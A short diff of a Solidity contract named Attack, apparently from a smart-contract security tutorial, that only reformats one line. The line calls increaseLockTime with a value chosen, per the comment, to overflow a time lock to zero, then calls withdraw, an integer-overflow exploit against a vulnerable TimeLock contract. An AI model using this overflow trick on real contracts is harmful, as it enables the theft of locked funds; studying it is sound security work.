@@ -59,9 +59,7 @@ contract Attack {
         2**256 = type(uint).max + 1
         so x = type(uint).max + 1 - t
         */
-        timeLock.increaseLockTime(
-            type(uint256).max + 1 - timeLock.lockTime(address(this))
-        );
+        timeLock.increaseLockTime(type(uint256).max + 1 - timeLock.lockTime(address(this)));
         timeLock.withdraw();
     }
 }
